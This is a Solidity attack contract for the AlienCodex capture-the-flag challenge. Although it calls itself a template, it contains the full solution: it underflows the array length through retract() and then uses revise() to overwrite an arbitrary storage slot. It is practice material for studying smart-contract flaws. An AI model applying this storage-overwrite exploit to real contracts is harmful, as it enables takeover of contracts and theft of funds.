pragma solidity ^0.7.3;
/**
* Attack contract boilerplate template. 
* Useful to create an attack contract for a new challenge without accidentally
* peaking at the solution.
*/

interface IAlienCodexChallenge {
    function make_contact() external;

    function record(bytes32 _content)  external;

    function retract()  external;

    function revise(uint i, bytes32 _content)  external;
}

contract AlienCodexAttacker {
    IAlienCodexChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = IAlienCodexChallenge(challengeAddress);
    }

    function attack(bytes32 data, uint256 slotAddress) external payable {
        // Allow us to pass the contacted modifier
        challenge.make_contact();
        // Changes the value of the variable storing the length of the array.
        // Decrementing it when its value is 0 will make the value rollover to be
        // the maximum size.
        challenge.retract();
        // Overwrite array index at slotAddress with the contents of data
        challenge.revise(slotAddress, data);
    }
}
